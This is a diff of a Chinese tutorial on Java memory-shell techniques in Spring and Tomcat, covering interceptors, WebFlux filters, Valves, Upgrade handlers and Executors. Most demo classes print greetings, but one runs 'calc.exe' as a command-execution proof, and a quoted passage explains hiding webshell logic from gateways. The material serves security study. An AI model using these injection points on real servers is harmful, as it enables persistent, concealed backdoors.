+protected final void initServletBean() throws ServletException {
+    getServletContext().log("Initializing Spring " + getClass().getSimpleName() + " '" + getServletName() + "'");
+    if (logger.isInfoEnabled()) {
+        logger.info("Initializing Servlet '" + getServletName() + "'");
+    }
+    long startTime = System.currentTimeMillis();
 
-    try {
-        this.webApplicationContext = initWebApplicationContext();
-        initFrameworkServlet();
-    }
-    catch (ServletException | RuntimeException ex) {
-        logger.error("Context initialization failed", ex);
-        throw ex;
-    }
+    try {
+        this.webApplicationContext = initWebApplicationContext();
+        initFrameworkServlet();
+    }
+    catch (ServletException | RuntimeException ex) {
+        logger.error("Context initialization failed", ex);
+        throw ex;
+    }
 
-    if (logger.isDebugEnabled()) {
-        String value = this.enableLoggingRequestDetails ?
-                "shown which may lead to unsafe logging of potentially sensitive data" :
-                "masked to prevent unsafe logging of potentially sensitive data";
-        logger.debug("enableLoggingRequestDetails='" + this.enableLoggingRequestDetails +
-                "': request parameters and headers will be " + value);
-    }
+    if (logger.isDebugEnabled()) {
+        String value = this.enableLoggingRequestDetails ?
+                "shown which may lead to unsafe logging of potentially sensitive data" :
+                "masked to prevent unsafe logging of potentially sensitive data";
+        logger.debug("enableLoggingRequestDetails='" + this.enableLoggingRequestDetails +
+                "': request parameters and headers will be " + value);
+    }
 
-    if (logger.isInfoEnabled()) {
-        logger.info("Completed initialization in " + (System.currentTimeMillis() - startTime) + " ms");
-    }
+    if (logger.isInfoEnabled()) {
+        logger.info("Completed initialization in " + (System.currentTimeMillis() - startTime) + " ms");
+    }
 }
 
 
@@ -1108,8 +1108,8 @@ org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.h
 我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断`handler`是否是字符串类型，如果是，则通过`ApplicationContext`获取它的类型；否则，直接获取`handler`的类型。：
 
 ```
-Class<?> handlerType = (handler instanceof String ?
-            obtainApplicationContext().getType((String) handler) : handler.getClass());
+Class<?> handlerType = (handler instanceof String ?
+            obtainApplicationContext().getType((String) handler) : handler.getClass());
 
 
 ```
@@ -1117,17 +1117,17 @@ Class<?> handlerType = (handler instanceof String ?
 然后是这部分：
 
 ```
-Class<?> userType = ClassUtils.getUserClass(handlerType);
-Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
-        (MethodIntrospector.MetadataLookup<T>) method -> {
-            try {
-                return getMappingForMethod(method, userType);
-            }
-            catch (Throwable ex) {
-                throw new IllegalStateException("Invalid mapping on handler class [" +
-                        userType.getName() + "]: " + method, ex);
-            }
-        });
+Class<?> userType = ClassUtils.getUserClass(handlerType);
+Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
+        (MethodIntrospector.MetadataLookup<T>) method -> {
+            try {
+                return getMappingForMethod(method, userType);
+            }
+            catch (Throwable ex) {
+                throw new IllegalStateException("Invalid mapping on handler class [" +
+                        userType.getName() + "]: " + method, ex);
+            }
+        });
 
 
 ```
@@ -1149,7 +1149,7 @@ Map<Method, T> methods = MethodIntrospector.selectMethods(userType,
 分开来看，首先是第一行：
 
 ```
-RequestMappingInfo info = createRequestMappingInfo(method);
+RequestMappingInfo info = createRequestMappingInfo(method);
 
 
 ```
@@ -1167,8 +1167,8 @@ RequestMappingInfo info = createRequestMappingInfo(method);
 直接看`lambda`表达式里面的内容：
 
 ```
-Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);
-registerHandlerMethod(handler, invocableMethod, mapping);
+Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);
+registerHandlerMethod(handler, invocableMethod, mapping);
 
 
 ```
@@ -1183,7 +1183,7 @@ registerHandlerMethod(handler, invocableMethod, mapping);
 
 我们回顾之前聊到的`Controller`的思路和下面的`4.1`节中所展示的`Controller`内存马，可以考虑到这样一个问题：
 
-> 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？      ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/`
+> 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的`shell`路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入`java`内存马时，尽量不要使用新的路由来专门处理我们注入的`webshell`逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们`webshell`逻辑的处理。在`tomcat`容器下，有`filter`、`listener`等技术可以达到上述要求。那么在 `spring` 框架层面下，有办法达到上面所说的效果吗？      ——摘编自`https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md`和`https://landgrey.me/blog/19/`
 
 答案是当然有，这就是我们要讲的`Spring Interceptor`，`Spring`框架中的一种拦截器机制。
 
@@ -1497,28 +1497,28 @@ registerHandlerMethod(handler, invocableMethod, mapping);
 这里我们以`WebFilter`为例，看看它的运行过程。新建一个`GreetingFilter.java`，代码如下：
 
 ```
-package org.example.webfluxmemoryshelldemo.hello;
+package org.example.webfluxmemoryshelldemo.hello;
 
-import org.springframework.http.server.reactive.ServerHttpRequest;
-import org.springframework.stereotype.Component;
-import org.springframework.web.server.ServerWebExchange;
-import org.springframework.web.server.WebFilter;
-import org.springframework.web.server.WebFilterChain;
-import org.springframework.web.util.pattern.PathPattern;
-import org.springframework.web.util.pattern.PathPatternParser;
-import reactor.core.publisher.Mono;
+import org.springframework.http.server.reactive.ServerHttpRequest;
+import org.springframework.stereotype.Component;
+import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
+import org.springframework.web.server.WebFilterChain;
+import org.springframework.web.util.pattern.PathPattern;
+import org.springframework.web.util.pattern.PathPatternParser;
+import reactor.core.publisher.Mono;
 
 @Component
-public class GreetingFilter implements WebFilter {
-    @Override
-    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
-        PathPattern pattern=new PathPatternParser().parse("/hello/**");
-        ServerHttpRequest request=serverWebExchange.getRequest();
-        if (pattern.matches(request.getPath().pathWithinApplication())){
-            System.out.println("hello, this is our filter!");
-        }
-        return webFilterChain.filter(serverWebExchange);
-    }
+public class GreetingFilter implements WebFilter {
+    @Override
+    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
+        PathPattern pattern=new PathPatternParser().parse("/hello/**");
+        ServerHttpRequest request=serverWebExchange.getRequest();
+        if (pattern.matches(request.getPath().pathWithinApplication())){
+            System.out.println("hello, this is our filter!");
+        }
+        return webFilterChain.filter(serverWebExchange);
+    }
 }
 
 
@@ -1583,44 +1583,44 @@ public class GreetingFilter implements WebFilter {
 然后我们把我们的`GreetingFilter.java`的代码修改成下面的：
 
 ```
-package org.example.webfluxmemoryshelldemo.hello;
+package org.example.webfluxmemoryshelldemo.hello;
 
-import org.springframework.http.server.reactive.ServerHttpRequest;
-import org.springframework.stereotype.Component;
-import org.springframework.web.server.ServerWebExchange;
-import org.springframework.web.server.WebFilter;
-import org.springframework.web.server.WebFilterChain;
-import org.springframework.web.util.pattern.PathPattern;
-import org.springframework.web.util.pattern.PathPatternParser;
-import reactor.core.publisher.Mono;
+import org.springframework.http.server.reactive.ServerHttpRequest;
+import org.springframework.stereotype.Component;
+import org.springframework.web.server.ServerWebExchange;
+import org.springframework.web.server.WebFilter;
+import org.springframework.web.server.WebFilterChain;
+import org.springframework.web.util.pattern.PathPattern;
+import org.springframework.web.util.pattern.PathPatternParser;
+import reactor.core.publisher.Mono;
 
-import me.gv7.tools.josearcher.entity.Blacklist;
-import me.gv7.tools.josearcher.entity.Keyword;
-import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
-import java.util.ArrayList;
-import java.util.List;
+import me.gv7.tools.josearcher.entity.Blacklist;
+import me.gv7.tools.josearcher.entity.Keyword;
+import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
+import java.util.ArrayList;
+import java.util.List;
 
 @Component
-public class GreetingFilter implements WebFilter {
-    @Override
-    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
-        PathPattern pattern=new PathPatternParser().parse("/hello/**");
-        ServerHttpRequest request=serverWebExchange.getRequest();
-        if (pattern.matches(request.getPath().pathWithinApplication())){
-            System.out.println("hello, this is our GreetingFilter!");
-        }
-        List<Keyword> keys = new ArrayList<>();
-        keys.add(new Keyword.Builder().setField_type("DefaultWebFilterChain").build());
-        List<Blacklist> blacklists = new ArrayList<>();
-        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
-        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
-        searcher.setBlacklists(blacklists);
-        searcher.setIs_debug(true);
-        searcher.setMax_search_depth(10);
-        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
-        searcher.searchObject();
-        return webFilterChain.filter(serverWebExchange);
-    }
+public class GreetingFilter implements WebFilter {
+    @Override
+    public Mono<Void> filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) {
+        PathPattern pattern=new PathPatternParser().parse("/hello/**");
+        ServerHttpRequest request=serverWebExchange.getRequest();
+        if (pattern.matches(request.getPath().pathWithinApplication())){
+            System.out.println("hello, this is our GreetingFilter!");
+        }
+        List<Keyword> keys = new ArrayList<>();
+        keys.add(new Keyword.Builder().setField_type("DefaultWebFilterChain").build());
+        List<Blacklist> blacklists = new ArrayList<>();
+        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
+        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+        searcher.setBlacklists(blacklists);
+        searcher.setIs_debug(true);
+        searcher.setMax_search_depth(10);
+        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
+        searcher.searchObject();
+        return webFilterChain.filter(serverWebExchange);
+    }
 }
 
 
@@ -1633,17 +1633,17 @@ public class GreetingFilter implements WebFilter {
 也就是说，位置是在：
 
 ```
-TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
-  ---> group = {java.lang.ThreadGroup} 
-   ---> threads = {class [Ljava.lang.Thread;} 
-    ---> [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
-     ---> this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} 
-      ---> handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} 
-       ---> httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} 
-        ---> delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} 
-         ---> delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} 
-           ---> delegate = {org.springframework.web.server.handler.FilteringWebHandler} 
-            ---> chain = {org.springframework.web.server.handler.DefaultWebFilterChain}
+TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
+  ---> group = {java.lang.ThreadGroup} 
+   ---> threads = {class [Ljava.lang.Thread;} 
+    ---> [3] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} 
+     ---> this$0 = {org.springframework.boot.web.embedded.netty.NettyWebServer} 
+      ---> handler = {org.springframework.http.server.reactive.ReactorHttpHandlerAdapter} 
+       ---> httpHandler = {org.springframework.boot.web.reactive.context.WebServerManager$DelayedInitializationHttpHandler} 
+        ---> delegate = {org.springframework.web.server.adapter.HttpWebHandlerAdapter} 
+         ---> delegate = {org.springframework.web.server.handler.ExceptionHandlingWebHandler} 
+           ---> delegate = {org.springframework.web.server.handler.FilteringWebHandler} 
+            ---> chain = {org.springframework.web.server.handler.DefaultWebFilterChain}
 
 
 ```
@@ -1688,22 +1688,22 @@ TargetObject = {reactor.netty.resources.DefaultLoopResources$EventLoop} 
 然后创建`test`目录并在`test`目录下创建两个文件，`TestValve.java`：
 
 ```
-package org.example.valvememoryshelldemo.test;
+package org.example.valvememoryshelldemo.test;
 
-import java.io.IOException;
-import org.apache.catalina.connector.Request;
-import org.apache.catalina.connector.Response;
-import org.apache.catalina.valves.ValveBase;
-import org.springframework.stereotype.Component;
+import java.io.IOException;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.Response;
+import org.apache.catalina.valves.ValveBase;
+import org.springframework.stereotype.Component;
 
 @Component
-public class TestValve extends ValveBase {
-    @Override
-    public void invoke(Request request, Response response) throws IOException {
-        response.setContentType("text/plain");
-        response.setCharacterEncoding("UTF-8");
-        response.getWriter().write("Valve 被成功调用");
-    }
+public class TestValve extends ValveBase {
+    @Override
+    public void invoke(Request request, Response response) throws IOException {
+        response.setContentType("text/plain");
+        response.setCharacterEncoding("UTF-8");
+        response.getWriter().write("Valve 被成功调用");
+    }
 }
 
 
@@ -1712,27 +1712,27 @@ public class TestValve extends ValveBase {
 还有`TestConfig.java`：
 
 ```
-package org.example.valvememoryshelldemo.test;
+package org.example.valvememoryshelldemo.test;
 
-import org.apache.catalina.Valve;
-import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
-import org.springframework.boot.web.server.WebServerFactoryCustomizer;
-import org.springframework.context.annotation.Bean;
-import org.springframework.context.annotation.Configuration;
+import org.apache.catalina.Valve;
+import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
+import org.springframework.boot.web.server.WebServerFactoryCustomizer;
+import org.springframework.context.annotation.Bean;
+import org.springframework.context.annotation.Configuration;
 
 @Configuration
-public class TestConfig {
-    @Bean
-    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
-        return factory -> {
-            factory.addContextValves(getTestValve());
-        };
-    }
-    
-    @Bean
-    public Valve getTestValve() {
-        return new TestValve();
-    }
+public class TestConfig {
+    @Bean
+    public WebServerFactoryCustomizer<TomcatServletWebServerFactory> tomcatCustomizer() {
+        return factory -> {
+            factory.addContextValves(getTestValve());
+        };
+    }
+    
+    @Bean
+    public Valve getTestValve() {
+        return new TestValve();
+    }
 }
 
 
@@ -1749,25 +1749,25 @@ public class TestConfig {
 点进`valve`可以看到该接口代码如下，这里我加上了注释：
 
 ```
-package org.apache.catalina;
+package org.apache.catalina;
 
-import java.io.IOException;
-import javax.servlet.ServletException;
-import org.apache.catalina.connector.Request;
-import org.apache.catalina.connector.Response;
+import java.io.IOException;
+import javax.servlet.ServletException;
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.connector.Response;
 
-public interface Valve {
-    // 获取下一个阀门
-    public Valve getNext();
-    // 设置下一个阀门
-    public void setNext(Valve valve);
-    // 后台执行逻辑，主要在类加载上下文中使用到
-    public void backgroundProcess();
-    // 执行业务逻辑
-    public void invoke(Request request, Response response)
-        throws IOException, ServletException;
-    // 是否异步执行
-    public boolean isAsyncSupported();
+public interface Valve {
+    // 获取下一个阀门
+    public Valve getNext();
+    // 设置下一个阀门
+    public void setNext(Valve valve);
+    // 后台执行逻辑，主要在类加载上下文中使用到
+    public void backgroundProcess();
+    // 执行业务逻辑
+    public void invoke(Request request, Response response)
+        throws IOException, ServletException;
+    // 是否异步执行
+    public boolean isAsyncSupported();
 }
 
 
@@ -1782,7 +1782,7 @@ public interface Valve {
 在`StandardHostValve.java`中，代码为：
 
 ```
-context.getPipeline().getFirst().invoke(request, response);
+context.getPipeline().getFirst().invoke(request, response);
 
 
 ```
@@ -1792,7 +1792,7 @@ context.getPipeline().getFirst().invoke(request, response);
 在`StandardEngineValve.java`中，代码为：
 
 ```
-host.getPipeline().getFirst().invoke(request, response);
+host.getPipeline().getFirst().invoke(request, response);
 
 
 ```
@@ -1839,52 +1839,52 @@ host.getPipeline().getFirst().invoke(request, response);
 我这里在之前的`Tomcat Valve`项目的基础上做了简单的修改，删除之前`test`目录下的`TestValve.java`，新建一个`TestUpgrade.java`：
 
 ```
-package org.example.valvememoryshelldemo.test;
+package org.example.valvememoryshelldemo.test;
 
-import org.apache.coyote.*;
-import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
-import org.apache.tomcat.util.net.SocketWrapperBase;
-import org.springframework.context.annotation.Configuration;
-import java.lang.reflect.Field;
-import java.nio.ByteBuffer;
+import org.apache.coyote.*;
+import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
+import org.apache.tomcat.util.net.SocketWrapperBase;
+import org.springframework.context.annotation.Configuration;
+import java.lang.reflect.Field;
+import java.nio.ByteBuffer;
 
 @Configuration
-public class TestUpgrade implements UpgradeProtocol {
-    @Override
-    public String getHttpUpgradeName(boolean b) {
-        return "hello";
-    }
+public class TestUpgrade implements UpgradeProtocol {
+    @Override
+    public String getHttpUpgradeName(boolean b) {
+        return "hello";
+    }
 
-    @Override
-    public byte[] getAlpnIdentifier() {
-        return new byte[0];
-    }
+    @Override
+    public byte[] getAlpnIdentifier() {
+        return new byte[0];
+    }
 
-    @Override
-    public String getAlpnName() {
-        return null;
-    }
+    @Override
+    public String getAlpnName() {
+        return null;
+    }
 
-    @Override
-    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
-        return null;
-    }
+    @Override
+    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
+        return null;
+    }
 
-    @Override
-    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, Request request) {
-        return null;
-    }
+    @Override
+    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapper, Adapter adapter, Request request) {
+        return null;
+    }
 
-    public boolean accept(org.apache.coyote.Request request) {
+    public boolean accept(org.apache.coyote.Request request) {
 
-        try {
-            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
-            response.setAccessible(true);
-            Response resp = (Response) response.get(request);
-            resp.doWrite(ByteBuffer.wrap("\n\nHello, this my test Upgrade!\n\n".getBytes()));
-        } catch (Exception ignored) {}
-        return false;
-    }
+        try {
+            Field response = org.apache.coyote.Request.class.getDeclaredField("response");
+            response.setAccessible(true);
+            Response resp = (Response) response.get(request);
+            resp.doWrite(ByteBuffer.wrap("\n\nHello, this my test Upgrade!\n\n".getBytes()));
+        } catch (Exception ignored) {}
+        return false;
+    }
 }
 
 
@@ -1893,21 +1893,21 @@ public class TestUpgrade implements UpgradeProtocol {
 然后修改`TestConfig.java`如下：
 
 ```
-package org.example.valvememoryshelldemo.test;
+package org.example.valvememoryshelldemo.test;
 
-import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
-import org.springframework.boot.web.server.WebServerFactoryCustomizer;
-import org.springframework.stereotype.Component;
+import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
+import org.springframework.boot.web.server.WebServerFactoryCustomizer;
+import org.springframework.stereotype.Component;
 
 @Component
-public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {
+public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {
 
-    @Override
-    public void customize(TomcatServletWebServerFactory factory) {
-        factory.addConnectorCustomizers(connector -> {
-            connector.addUpgradeProtocol(new TestUpgrade());
-        });
-    }
+    @Override
+    public void customize(TomcatServletWebServerFactory factory) {
+        factory.addConnectorCustomizers(connector -> {
+            connector.addUpgradeProtocol(new TestUpgrade());
+        });
+    }
 }
 
 
@@ -1922,73 +1922,73 @@ public class TestConfig implements WebServerFactoryCustomizer<TomcatServletW
 当然也是可以利用`Tomcat`来搭建的，只需要`TestUpgrade.java`即可，因为里面含有定义的`servlet`逻辑：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import org.apache.catalina.connector.RequestFacade;
-import org.apache.catalina.connector.Request;
-import org.apache.coyote.Adapter;
-import org.apache.coyote.Processor;
-import org.apache.coyote.UpgradeProtocol;
-import org.apache.coyote.Response;
-import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
-import org.apache.tomcat.util.net.SocketWrapperBase;
-import java.lang.reflect.Field;
-import java.nio.ByteBuffer;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.apache.catalina.connector.RequestFacade;
+import org.apache.catalina.connector.Request;
+import org.apache.coyote.Adapter;
+import org.apache.coyote.Processor;
+import org.apache.coyote.UpgradeProtocol;
+import org.apache.coyote.Response;
+import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
+import org.apache.tomcat.util.net.SocketWrapperBase;
+import java.lang.reflect.Field;
+import java.nio.ByteBuffer;
 
 @WebServlet("/evil")
-public class TestUpgrade extends HttpServlet {
+public class TestUpgrade extends HttpServlet {
 
-    static class MyUpgrade implements UpgradeProtocol {
-        @Override
-        public String getHttpUpgradeName(boolean b) {
-            return null;
-        }
+    static class MyUpgrade implements UpgradeProtocol {
+        @Override
+        public String getHttpUpgradeName(boolean b) {
+            return null;
+        }
 
-        @Override
-        public byte[] getAlpnIdentifier() {
-            return new byte[0];
-        }
+        @Override
+        public byte[] getAlpnIdentifier() {
+            return new byte[0];
+        }
 
-        @Override
-        public String getAlpnName() {
-            return null;
-        }
+        @Override
+        public String getAlpnName() {
+            return null;
+        }
 
-        @Override
-        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
-            return null;
-        }
+        @Override
+        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
+            return null;
+        }
 
-        @Override
-        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
-            return null;
-        }
+        @Override
+        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
+            return null;
+        }
 
-        @Override
-        public boolean accept(org.apache.coyote.Request request) {
-            try {
-                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
-                response.setAccessible(true);
-                Response resp = (Response) response.get(request);
-                resp.doWrite(ByteBuffer.wrap("Hello, this my test Upgrade!".getBytes()));
-            } catch (Exception ignored) {}
-            return false;
-        }
-    }
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
-        try {
-            RequestFacade rf = (RequestFacade) req;
-            Field requestField = RequestFacade.class.getDeclaredField("request");
-            requestField.setAccessible(true);
-            Request request1 = (Request) requestField.get(rf);
-            new MyUpgrade().accept(request1.getCoyoteRequest());
-        } catch (Exception ignored) {}
-    }
+        @Override
+        public boolean accept(org.apache.coyote.Request request) {
+            try {
+                Field response = org.apache.coyote.Request.class.getDeclaredField("response");
+                response.setAccessible(true);
+                Response resp = (Response) response.get(request);
+                resp.doWrite(ByteBuffer.wrap("Hello, this my test Upgrade!".getBytes()));
+            } catch (Exception ignored) {}
+            return false;
+        }
+    }
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+        try {
+            RequestFacade rf = (RequestFacade) req;
+            Field requestField = RequestFacade.class.getDeclaredField("request");
+            requestField.setAccessible(true);
+            Request request1 = (Request) requestField.get(rf);
+            new MyUpgrade().accept(request1.getCoyoteRequest());
+        } catch (Exception ignored) {}
+    }
 }
 
 
@@ -2070,28 +2070,28 @@ public class TestUpgrade extends HttpServlet {
 新建一个项目，配置好`tomcat`运行环境和`web`目录，然后新建以下两个文件，第一个是 TestExecutor.java：
 
 ```
-package org.example;
+package org.example;
 
-import java.io.IOException;
-import java.util.concurrent.SynchronousQueue;
-import java.util.concurrent.ThreadPoolExecutor;
-import java.util.concurrent.TimeUnit;
+import java.io.IOException;
+import java.util.concurrent.SynchronousQueue;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
 
-public class TestExecutor extends ThreadPoolExecutor {
+public class TestExecutor extends ThreadPoolExecutor {
 
-    public TestExecutor() {
-        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
-    }
+    public TestExecutor() {
+        super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
+    }
 
-    @Override
-    public void execute(Runnable command) {
-        try {
-            Runtime.getRuntime().exec("calc.exe");
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
-        super.execute(command);
-    }
+    @Override
+    public void execute(Runnable command) {
+        try {
+            Runtime.getRuntime().exec("calc.exe");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        super.execute(command);
+    }
 }
 
 
@@ -2100,23 +2100,23 @@ public class TestExecutor extends ThreadPoolExecutor {
 第二个是`TestServlet.java`：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 @WebServlet("/test")
-public class TestServlet extends HttpServlet {
-    TestExecutor executor = new TestExecutor();
+public class TestServlet extends HttpServlet {
+    TestExecutor executor = new TestExecutor();
 
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
-        executor.execute(() -> {
-            System.out.println("Execute method triggered by accessing /test");
-        });
-    }
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+        executor.execute(() -> {
+            System.out.println("Execute method triggered by accessing /test");
+        });
+    }
 }
 
 
@@ -2160,9 +2160,9 @@ public class TestServlet extends HttpServlet {
 
 ```
 <dependency>
-    <groupId>org.apache.tomcat</groupId>
-    <artifactId>tomcat-coyote</artifactId>
-    <version>9.0.83</version>
+    <groupId>org.apache.tomcat</groupId>
+    <artifactId>tomcat-coyote</artifactId>
+    <version>9.0.83</version>
 </dependency>
 
 
@@ -2211,38 +2211,38 @@ public class TestServlet extends HttpServlet {
 那就试试看呗，我们导入`jar`包到项目之后修改`TestServlet.java`代码如下：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import me.gv7.tools.josearcher.entity.Blacklist;
-import me.gv7.tools.josearcher.entity.Keyword;
-import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
-import java.util.ArrayList;
-import java.util.List;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import me.gv7.tools.josearcher.entity.Blacklist;
+import me.gv7.tools.josearcher.entity.Keyword;
+import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
+import java.util.ArrayList;
+import java.util.List;
 
 @WebServlet("/test")
-public class TestServlet extends HttpServlet {
-    TestExecutor executor = new TestExecutor();
+public class TestServlet extends HttpServlet {
+    TestExecutor executor = new TestExecutor();
 
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
-        executor.execute(() -> {
-            System.out.println("Execute method triggered by accessing /test");
-        });
-        List<Keyword> keys = new ArrayList<>();
-        keys.add(new Keyword.Builder().setField_type("request").build());
-        List<Blacklist> blacklists = new ArrayList<>();
-        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
-        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
-        searcher.setBlacklists(blacklists);
-        searcher.setIs_debug(true);
-        searcher.setMax_search_depth(10);
-        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
-        searcher.searchObject();
-    }
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
+        executor.execute(() -> {
+            System.out.println("Execute method triggered by accessing /test");
+        });
+        List<Keyword> keys = new ArrayList<>();
+        keys.add(new Keyword.Builder().setField_type("request").build());
+        List<Blacklist> blacklists = new ArrayList<>();
+        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
+        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
+        searcher.setBlacklists(blacklists);
+        searcher.setIs_debug(true);
+        searcher.setMax_search_depth(10);
+        searcher.setReport_save_path("D:\\javaSecEnv\\apache-tomcat-9.0.85\\bin");
+        searcher.searchObject();
+    }
 }
 
 
@@ -2255,17 +2255,17 @@ public class TestServlet extends HttpServlet {
 直接搜索到了这条链：
 
 ```
-TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
-  ---> group = {java.lang.ThreadGroup} 
-   ---> threads = {class [Ljava.lang.Thread;} 
-    ---> [15] = {java.lang.Thread} 
-     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
-      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
-       ---> connections = {java.util.Map<U, org.apache.tomcat.util.net.SocketWrapperBase<S>>} 
-        ---> [java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8080 remote=/0:0:0:0:0:0:0:1:10770]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
-         ---> socket = {org.apache.tomcat.util.net.NioChannel} 
